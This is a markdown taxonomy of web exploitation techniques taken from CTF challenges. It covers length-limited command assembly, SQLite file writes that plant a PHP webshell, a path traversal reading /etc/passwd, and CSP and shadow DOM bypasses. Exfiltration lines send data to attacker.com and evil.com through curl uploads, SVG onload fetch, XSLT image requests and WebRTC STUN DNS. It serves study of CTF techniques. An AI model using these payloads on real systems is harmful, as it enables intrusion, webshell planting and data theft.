# CTF Web Exploitation Primitives Taxonomy

> Web exploitation primitives recurring in CTFs that do not have dedicated taxonomy documents in the-map.
>
> **Scope**: Constrained web exploitation and browser-native mechanism abuse. General language jail escapes, cryptanalysis, and non-HTTP parser differentials are outside this document.

---

## Taxonomy Axes

| Axis | Description |
|------|------------|
| **Axis 1 — Primitive Class** | Structural category the trick belongs to |
| **Axis 2 — What is Manipulated** | The specific invariant, assumption, or mechanism being violated |
| **Axis 3 — Exploitation Outcome** | Concrete impact: oracle construction, RCE, or data exfiltration |

---

## Table of Contents

1. [Constrained Exploitation Primitives](#1-constrained-exploitation-primitives)
2. [Browser-Native Side Channels & Mechanism Abuse](#2-browser-native-side-channels--mechanism-abuse)
3. [Cross-Reference to Dedicated Documents](#3-cross-reference-to-dedicated-documents)

---

## 1. Constrained Exploitation Primitives

> Techniques for web-facing execution paths constrained by command length, query length, protocol access, or intermediary behavior.

### 1.1 Filesystem as Command Assembly Buffer (4–5 Byte RCE)

**What is manipulated**: When command execution is limited to N characters per invocation, the filesystem itself becomes a Turing-complete assembly buffer — file *names* encode command fragments, and `ls` output order reconstructs the full command.

**5-byte variant** (HITCON CTF 2017 "Babyfirst Revenge"):
```bash
# Each HTTP request executes: exec(input) where len(input) <= 5
# Strategy: create files whose names are command fragments, then assemble

>dir        # create empty file named "dir"
>sl         # create empty file named "sl"
>g\>        # create file named "g>"
>ht-        # create file named "ht-"
*>v         # glob-expand all filenames and write to file "v"
            # v now contains: "dir sl g> ht-" (or similar, depending on glob order)

>rev        # create file named "rev"
*v>x        # run "rev" on "v" contents → produces "ls -th >g" (reversed)
sh x        # execute "ls -th >g" — list files sorted by time into file "g"
sh g        # execute the assembled command in file "g"
```

**4-byte variant** (HITCON CTF 2017 "Babyfirst Revenge v2"): Same principle but requires additional tricks — `rev` command to reverse strings, continuation-line backslashes (`\`) split across multiple filenames, and glob expansion as an intermediate processing step.

**Key insight**: This is essentially a write-primitive-to-RCE chain using only the filesystem. Applicable whenever:
- Command length is severely restricted (WAF, input validation)
- Multiple command invocations are possible (e.g., repeated HTTP requests)
- The filesystem is writable and listable

### 1.2 SQLite `VACUUM INTO` as File-Write Primitive

**What is manipulated**: SQLite's `VACUUM INTO('path')` command dumps the entire database contents into a new file at an arbitrary path — converting SQL injection into arbitrary file write.

**HITCON CTF 2025 "Pholyglot"**: 30-character SQL injection into an INSERT statement.
```sql
-- Injected payload (≤30 chars):
');VACUUM INTO('f.php

-- Full assembled query:
INSERT INTO t VALUES('');VACUUM INTO('f.php')

-- Multi-stage exploitation:
-- 1. First requests: INSERT PHP code fragments into the database
-- 2. Final request: VACUUM INTO writes the DB (containing PHP code) to a .php file
-- 3. The PHP webshell is now accessible via HTTP
```

**Key conditions**:
- SQLite database (common in mobile apps, embedded systems, small web apps)
- SQL injection with statement termination (`;`)
- Writable filesystem path accessible via web

**Variant — SQLite `ATTACH DATABASE`**: Similar file-write primitive: `ATTACH DATABASE '/var/www/html/shell.php' AS pwn; CREATE TABLE pwn.x(d TEXT); INSERT INTO pwn.x VALUES('<?php system($_GET["c"]); ?>');`

### 1.3 TCP Port Reflection for Eval Injection

**What is manipulated**: When a server-side application scans TCP ports and evaluates responses, the attacker finds or creates a service that echoes back attacker-controlled data in the expected format.

**HITCON CTF 2025 "No Man's Echo"**: PHP script scans 43 ports starting from user-controlled offset, sends `php://input` to each, and `eval()`s any response matching `{"signal":"Arrival","logogram":"..."}`.

```
Attack:
  1. Find a TCP service on the host that echoes input (SMTP banner, FTP, Redis, etc.)
  2. Craft input so the echo produces valid JSON with PHP code in "logogram"
  3. Set the port scan offset to hit the reflecting service
  4. Server eval()s the reflected PHP code → RCE
```

### 1.4 Apache `mod_negotiation` Content-Type Bypass

**What is manipulated**: Apache's MultiViews content negotiation serves files with inferred Content-Types that differ from the upload directory's restrictions.

**HITCON CTF 2020 "oStyle"**: Upload directory has `php_flag engine off` (no PHP execution). But `mod_negotiation` with `MultiViews` enabled allows Apache to serve an uploaded `.html` file with `text/html` Content-Type based on content negotiation, bypassing the "no execution" restriction and enabling stored XSS.

### 1.5 ASP.NET Request Validation as Security Check Bypass

**What is manipulated**: ASP.NET's Request Validation throws exceptions on inputs containing `<`, `>`, etc. If error handling swallows this exception, security checks in the same try block are skipped.

**HITCON CTF 2019 "Buggy .Net"**:
```csharp
bool isBad = false;
try {
    if (Request.Form["filename"].Contains(".."))  // security check
        isBad = true;
} catch { }  // Request Validation exception swallowed here

if (!isBad) {
    // isBad is still false because the Contains() check never ran
    File.ReadAllText("C:\\inetpub\\wwwroot\\" + filename);  // path traversal
}
```

**Payload**: `filename=..\..\etc\passwd<` — the `<` triggers Request Validation exception before the `..` check executes, so `isBad` stays `false`.

### 1.6 cURL Config File Chaining for Raw TCP

**What is manipulated**: When `gopher://` is unavailable, cURL's `--config` (`-K`) option chains multiple cURL invocations through config files to achieve raw TCP communication.

**DiceCTF 2023 "unfinished"**: SSRF to MongoDB (Wire Protocol over TCP) without gopher support.
```
Stage 1: Write a cURL config file to disk using -o
  curl http://attacker.com/config.txt -o /tmp/curl.conf

Stage 2: Execute cURL with the config file to send raw MongoDB Wire Protocol
  curl -K /tmp/curl.conf
  # Config contains: url = "telnet://127.0.0.1:27017"
  # Plus binary data for MongoDB query

Stage 3: Upload the response (containing flag) to attacker server
  curl -T /tmp/mongo_response http://attacker.com/exfil
```

---

## 2. Browser-Native Side Channels & Mechanism Abuse

> Novel browser-side exploitation primitives that abuse legitimate web platform features in unintended ways. These are distinct from standard XS-Leaks (covered in `05-client-side/xs-leak.md`) because they exploit *specific browser implementation details or newer APIs* rather than general cross-origin information leakage patterns.

### 2.1 Browser Crash / Hang as 1-Bit Oracle

**What is manipulated**: A browser rendering bug causes a tab crash or extreme slowdown *conditional* on page content. The crash/hang itself becomes a detectable signal.

**DiceCTF 2024 "another-csp"**: CSS `color-mix()` with `srgb(from var(...))` triggered a Chromium rendering bug that crashed the tab. By making the CSS selector conditional on a data attribute:

```css
/* If the token starts with "a", apply the crashing CSS: */
h1[data-token^="a"] {
    color: color-mix(in srgb, blue 50%, srgb(from var(--c1) r g b));
}
```

- Crash (detected via 10s timeout) = character match
- No crash = no match
- Binary search extracts the full token character by character

**Variant — CSS variable recursion**: Instead of a crash, use billion-laughs-style CSS variable expansion to cause measurable slowdown:
```css
/* Exponential expansion causes detectable delay: */
:root { --a: var(--b)var(--b); --b: var(--c)var(--c); /* ... */ }
h1[data-token^="a"] { content: var(--a); }
```

### 2.2 Closed Shadow DOM Breach via Deprecated APIs

**What is manipulated**: Closed Shadow DOM is supposed to be an impenetrable encapsulation boundary. Deprecated WebKit CSS properties combined with deprecated DOM APIs pierce through it.

**DiceCTF 2022 "shadow"**: The flag is inside a closed Shadow DOM with all `document`/`window` references nulled.

```css
/* Step 1: Apply deprecated CSS to make shadow host editable */
#shadow-host {
    -webkit-user-modify: read-write;
}
```

```javascript
// Step 2: Use window.find() to focus text within the shadow boundary
window.find('flag');

// Step 3: Use deprecated execCommand to inject into the shadow context
document.execCommand('insertHTML', false, '<svg onload="fetch(`https://evil.com/?`+this.getRootNode().textContent)">');
// The SVG executes inside the shadow DOM context → can read enclosed content
```

**Key insight**: `-webkit-user-modify` enables `contenteditable`-like behavior on the shadow host. `window.find()` + `document.execCommand` then operate *inside* the shadow boundary because the editable region spans it.

### 2.3 XSLT/XXE in Browser with JavaScript Disabled

**What is manipulated**: Puppeteer's `page.setJavaScriptEnabled(false)` only disables JavaScript — the browser's XML/XSLT processing engine remains fully active and is not restricted by CSP.

**DiceCTF 2023 "impossible-xss"**:
```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="data:text/xml,
  <xsl:stylesheet xmlns:xsl='http://www.w3.org/1999/XSL/Transform' version='1.0'>
    <xsl:template match='/'>
      <html>
        <body>
          <img src='https://evil.com/?exfil=xslt-triggered-request'/>
        </body>
      </html>
    </xsl:template>
  </xsl:stylesheet>
"?>
<root/>
```

**Why it works**: XSLT is processed by a separate engine in the browser, not the JavaScript engine. CSP `script-src` doesn't block XSLT processing. `setJavaScriptEnabled(false)` doesn't affect XML parsing. The XSLT output (HTML) can include `<img>` tags for data exfiltration.

### 2.4 Chrome Text Fragment Pixel Side-Channel

**What is manipulated**: Chrome's Scroll-to-Text Fragment (`#:~:text=`) highlights matching text with a yellow background. This visual change is detectable even after extreme image downsampling.

**HITCON CTF 2021 "Vulpixelize"**: A screenshot service captures URLs at 1920x1080, downscales to 64x64, then upscales back (extreme pixelation).

```
Attack:
  1. The /flag endpoint returns the flag only to 127.0.0.1
  2. The screenshot service accesses URLs from localhost
  3. Request: http://127.0.0.1:8000/flag#:~:text=hitcon{a
     → If "hitcon{a" exists in the page, Chrome highlights it (yellow background)
     → Even at 64x64, the color difference is measurable
  4. Binary search over characters: highlighted = match, no highlight = no match
```

### 2.5 Cookie Parser Differential (Jetty / Tomcat Quote Smuggling)

> **→ Comprehensive coverage**: `05-client-side/cookie.md` §1-2 (Cookie Sandwich), §2-1 (Legacy RFC Parsing), §2-2 (Quoted-Value Parsing Differentials). This section retains only the CTF-specific exploitation chain.

**DiceCTF 2023 "jnotes"**: Combined cookie path ordering + Jetty RFC 2109 quoted-string absorption to leak HttpOnly flags. The novel element was using Chrome's path-length-first cookie ordering to position an attacker-set cookie (`=note="`) before the HttpOnly cookie, causing Jetty's parser to absorb the flag into the quoted value.

### 2.6 WebRTC STUN DNS Exfiltration (CSP Bypass)

**What is manipulated**: CSP does not restrict WebRTC ICE candidate gathering. Creating an `RTCPeerConnection` with a STUN server URL containing encoded data triggers a DNS lookup that exfiltrates data.

**corCTF 2023 "crabspace"**: Strict CSP (`default-src 'none'; script-src 'unsafe-inline'`) blocks all network requests. But WebRTC is exempt:

```javascript
// CSP blocks: fetch(), XHR, img src, script src, etc.
// CSP does NOT block: WebRTC STUN/TURN ICE candidate gathering

const pc = new RTCPeerConnection({
    iceServers: [{ urls: 'stun:' + encodedData + '.attacker.com:1337' }]
});
pc.createDataChannel('');
pc.createOffer().then(o => pc.setLocalDescription(o));
// → DNS query for "{encodedData}.attacker.com" → attacker's DNS server captures it
```

**Key insight**: This bypasses even the strictest CSP configurations. The W3C is aware (CSP Issue #92) but WebRTC ICE candidate gathering remains unrestricted.

### 2.7 bfcache Weaponization (Response Replay)

**What is manipulated**: The browser's back-forward cache (bfcache) stores complete page snapshots. Navigating back replays the cached response — including any poisoned headers or content from the initial load.

**corCTF 2024 "iframe-note"**: Prototype pollution injects a `SCRIPT_NAME` header into fetch requests. Gunicorn uses this to determine the base URL, causing `<script src>` attributes to resolve to the attacker's domain. But this only works for the *initial* page load. The exploit forces a forward navigation, then triggers back-navigation — bfcache replays the poisoned response, loading attacker's scripts.

### 2.8 CSP `report-uri` as Exfiltration Channel

**What is manipulated**: When a CSP violation occurs, the browser sends a JSON report to `report-uri`. The `script-sample` field in violation reports contains approximately the first 40 characters of the blocked content, and only when the `'report-sample'` directive is present in the CSP. By intentionally triggering violations, the attacker can use this as a limited data exfiltration channel — not full content, but enough for short secrets like flags.

**DiceCTF 2023 "codebox"**: Inject `require-trusted-types-for 'script'` into CSP. Any `innerHTML` assignment now triggers a Trusted Types violation. The violation report's sample field leaks a prefix of the blocked content — sufficient for flag extraction in CTF contexts where the flag fits within the sample limit.

### 2.9 Unicode Case-Folding Length Confusion in WASM

**What is manipulated**: Unicode case conversion can change string length (German `ß` → `SS`, ligature `ﬃ` → `FFI`). When WASM calculates buffer size *before* conversion, the expanded result overflows the safety check boundary.

**DiceCTF 2022 "blazingfast"**: WASM-based "MoCkInG CaSe" converter checks first N characters for safety.

```
Input: "ß" × 500 + "<img src=x onerror=alert(1)>"

WASM length check: examines first 500 bytes → all safe 'ß' characters ✓
After uppercase conversion: "SS" × 500 + "<img src=x onerror=alert(1)>"
  → The converted string is 1000+ bytes, but the XSS payload at position 500+
    was never examined because the length check only covered the pre-conversion size
```

### 2.10 Nginx Error Response CSP Header Omission

**What is manipulated**: Nginx middleware that adds CSP headers via `add_header` only applies to 2xx and 3xx responses by default. Error responses (4xx, 5xx) lack CSP headers.

**corCTF 2023 "leakynote"**: Search returning no results triggers 404. The 404 response has no `frame-ancestors` CSP → the page can be iframed. By testing if the iframe loads (no CSP) or is blocked (CSP present), the attacker determines whether a search query has results — a binary oracle for character-by-character flag extraction.

```nginx
# Nginx config — VULNERABLE pattern (missing "always"):
add_header Content-Security-Policy "frame-ancestors 'none'";
# Without "always", the header is only added to 2xx/3xx responses
# 4xx/5xx responses lack CSP → can be iframed

# FIXED pattern:
# add_header Content-Security-Policy "frame-ancestors 'none'" always;
```

---

## 3. Cross-Reference to Dedicated Documents

The following topics are frequently seen in CTFs but are comprehensively covered in their own taxonomy documents within the-map. **Do not add them to this document.**

| CTF Topic | Dedicated Document | Key Sections |
|-----------|-------------------|-------------|
| XS-Leaks (frame counting, timing, cache probing) | `05-client-side/xs-leak.md` | §1 Timing, §2 State-Based, §3 Event-Based |
| Prototype Pollution → RCE gadgets (EJS, Pug, child_process) | `01-injection/prototype-pollution.md` | §5 Server-Side Gadgets |
| PHP internals (iconv, session upload, extract, PHP-FPM) | `09-frameworks-and-languages/php.md` | §3–§8 |
| DOM Clobbering (router hijack, sanitizer bypass) | `05-client-side/dom-clobbering.md` | §1–§5 |
| CSS injection / exfiltration (`:has()`, `@import` chain) | `01-injection/css-injection.md` | CSS exfiltration sections |
| Client-Side Desync (browser-powered smuggling) | `03-http-protocol/http-parsing-discrepancy/http-request-smuggling.md` | CSD section |
| ESI / XSLT injection | `01-injection/ssi-esi-xslt-injection.md` | §2 ESI, §3 XSLT |
| HTML-to-PDF SSRF (wkhtmltopdf, Puppeteer, mPDF) | `04-server-side/document-media-processing-library-rce.md` | §9 HTML-to-PDF |
| LaTeX injection | `01-injection/latex-injection.md` | §1–§4 |
| Redis SSRF (Gopher, RESP injection) | `04-server-side/ssrf.md` | Protocol scheme abuse |
| Argument / flag injection (git, tar, curl, ssh) | `01-injection/command-injection.md` | §2 Argument Injection |
| Race conditions (single-packet, last-byte, multi-endpoint) | `07-application-logic/web-race-condition.md` | §1–§8 |
| SSTI payloads (Jinja2, Twig, FreeMarker, Velocity, Smarty) | `01-injection/ssti.md` | §1–§6 |
| HTTP/2 CONTINUATION flood / Rapid Reset | `03-http-protocol/http-parsing-discrepancy/http-request-smuggling.md` | HTTP/2 section |
| WebSocket hijacking (CSWSH) | `03-http-protocol/websocket.md` | Cross-site section |
| JSON number precision loss (IEEE 754 `2^53`) | `06-encoding-parser/type-confusion-and-coercion.md` | §9-4 |
| Cookie parser differentials (Jetty, Tomcat, RFC 2109 quoted-string) | `05-client-side/cookie.md` | §1-2 Cookie Sandwich, §2-1 Legacy RFC, §2-2 Quoted-Value |
| TLS attacks (CRIME, BREACH, ROBOT) | `07-application-logic/web-timing-attack.md` | TLS timing section |

---

## References

### CTF Challenge Archives & Writeups
- [Orange Tsai — My-CTF-Web-Challenges](https://github.com/orangetw/My-CTF-Web-Challenges) — 38+ HITCON CTF web challenges with source code and intended solutions
- [Huli — DiceCTF 2022 Writeups](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/) — Shadow DOM breach, blazingfast WASM bypass
- [Huli — DiceCTF 2023 Writeups](https://blog.huli.tw/2023/02/08/en/dicectf-2023-writeup/) — jwtjail Proxy escape, impossible-xss XSLT, jnotes cookie smuggling
- [Huli — DiceCTF 2024 Writeups](https://blog.huli.tw/2024/02/07/en/dicectf-2024-writeup/) — another-csp browser crash oracle
- [Huli — corCTF 2023 Writeups](https://blog.huli.tw/2023/08/07/en/corctf-2023-writeup/) — crabspace WebRTC exfil, leakynote Nginx CSP omission
- [Huli — GoogleCTF 2024 Writeups](https://blog.huli.tw/2024/06/28/en/google-ctf-2024-writeup/) — Grand Prix Heaven regex bypass
- [Huli — HITCON CTF & corCTF & SekaiCTF 2024](https://blog.huli.tw/2024/09/23/en/hitconctf-corctf-sekaictf-2024-writeup/) — Encoding differentials

### Specific Technique References
- [Chovid99 — Google CTF 2025](https://chovid99.github.io/posts/google-ctf-2025/) — Multiple challenge writeups
- [Ankur Sundara — corCTF 2024 iframe-note](https://ankursundara.com/blog/) — bfcache weaponization with prototype pollution
- [str.lc — DiceCTF 2023 codebox](https://str.lc/) — CSP report-uri exfiltration via Trusted Types

---

*This document covers web-focused exploitation primitives that fall outside the dedicated taxonomy documents in the-map.*
